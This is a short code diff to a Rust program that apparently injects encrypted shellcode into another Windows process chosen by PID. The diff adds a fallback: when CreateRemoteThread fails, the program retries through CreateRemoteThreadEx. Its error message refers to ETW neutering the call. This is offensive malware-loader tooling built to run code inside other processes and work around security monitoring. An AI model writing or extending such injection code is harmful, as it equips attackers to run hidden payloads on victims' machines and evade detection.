@@ -135,7 +135,6 @@ fn main() {
         iv: INITVEC
     };
     
-    
     let mut target_process = WindowsProcess::from_pid(target_pid);
     
     fetch_handle(&mut target_process);
@@ -165,7 +164,13 @@ fn main() {
         address_start
     ){
         Ok(_) => println!("[+] CreateRemoteThread succeeded."),
-        Err(e) => exit!(3, "[!] CreateRemoteThread error!\n-> {:#x}", e.0),
+        Err(e) => { 
+            eprintln!("[!] CreateRemoteThread error!\n-> {:#x}", e.0);
+            match win32_create_thread_ex(*target_process.handle.unwrap(), address_start as usize) {
+                Ok(_) => println!("[+] CreateRemoteThreadEx via win32 api succeeded."),
+                Err(e) => exit!(2, "[!] CreateRemoteThreadEx via win32 api failed: {:?}\n\\_Shellcode is broken or the ETW is used to neuter this call.", e),
+            }
+        },
     }
 
 }
